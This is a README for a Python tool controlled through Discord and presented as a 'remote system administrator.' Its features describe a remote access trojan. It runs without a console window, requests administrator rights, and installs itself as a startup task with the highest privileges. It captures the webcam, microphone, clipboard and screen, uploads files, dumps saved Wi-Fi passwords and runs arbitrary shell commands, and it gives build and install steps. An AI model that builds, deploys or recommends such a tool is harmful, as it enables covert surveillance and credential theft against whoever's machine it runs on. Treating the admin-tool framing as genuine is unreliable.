# Discord Remote System Administrator

A Python-based administration tool leveraging `discord.py` to manage local system utilities, execute remote commands, and streamline media or audio playback via Discord.

## Features

- **Access Control:** User ID verification ensures only authorized accounts can invoke commands.
- **SSH Key Management:** Generate and display ED25519 public SSH keys for secure host authorization.
- **System Diagnostics:** Monitor system hardware metrics, local IP configuration, and running processes.
- **Audio & Media Control:** Download and manage local audio assets in `%APPDATA%` for local device playback.
- **Persistence:** Makes a scheduled task with the highest priveleges, and makes it run on startup.

---

## Technical Stack & Dependencies

- **Language:** Python 3.10+
- **Core Framework:** [`discord.py`](https://github.com/Rapptz/discord.py)
- **Dependencies:**
  - `paramiko` (SSH interaction)
  - `requests` (Asset downloads)
  -  `sounddevice` / `scipy` (Audio handling)
  - `opencv-python` / `Pillow` / `pyautogui` (Image capture & input utilities)
  - `psutil` (System monitoring)

---

## Pyinstaller (Optional)
```pyinstaller --noconsole --onefile --collect-all discord --collect-all cv2 --collect-all sounddevice --collect-all scipy --collect-all PIL --name=bot --uac-admin --icon=icon.ico main.py```

## Config

- TOKEN = "Your bot token"
- ALLOWED_USER_ID = ur user id
- NOTIFICATION_CHANNEL_ID = channel id
- CAM_SCREENSHOT_WEBHOOK = "webhook"
- MIC_WEBHOOK = "webhook"

## cmds
- `!ssh` Display's the PC's ssh key
- `!sshreset` Reset's the PC's ssh key, with or without a passphrase. Usage: `!sshreset password`
- `!cam`  Captures webcam photo and routes it to a webhook.
- `!mic` Captures mic recording and sends it to a webhook. Usage: `!mic 5` (records mic for 5 secs) OR `!mic` (records mic for 10 secs by default)
- `!clipboard` Grabs the most recent clipboard entry
- `!fetch` Uploads a requested file from the PC to the channel.
- `!hotkey` Simulates a shortcut key combination (e.g., !hotkey alt f4)
- `!kill`  Kill a running task: !kill chrome.exe or !kill game.exe
- `!lock` Locks the PC the script is running on
- `!msgbox` Displays a popup message box. (e.g., !msgbox ALERT | your PC is hacked!!)
- `!press` Presses a single key. [I don't know why i added this if i already have hotkey]
- `!say` Uses windows text-to-speech to say something. (e.g., !say ballright)
- `!screenshot` Takes a screenshot of the PC the scripts running on.
- `!shutdown` Shuts down the PC
- `!status` just shows real-time CPU, RAM, Storage usage
- `!stopbot` just stops the script entirely. more like a self destruct feature
- `!wifi` Grabs all wifi networks that the PC has logged into and display's the network name and the password they used to connect to it.
- `!help` just shows the help menu
- `!cmd` it runs shell commands. (e.g., !cmd start "" https://example.com OR !cmd ipconfig OR !cmd dir)

## Installation & Setup

### 1. Clone & Install Dependencies
Ensure Python is installed and added to your system environment variables. Install required packages using `pip`:

```bash
pip install discord.py paramiko requests pygame sounddevice scipy opencv-python pillow pyautogui psutil
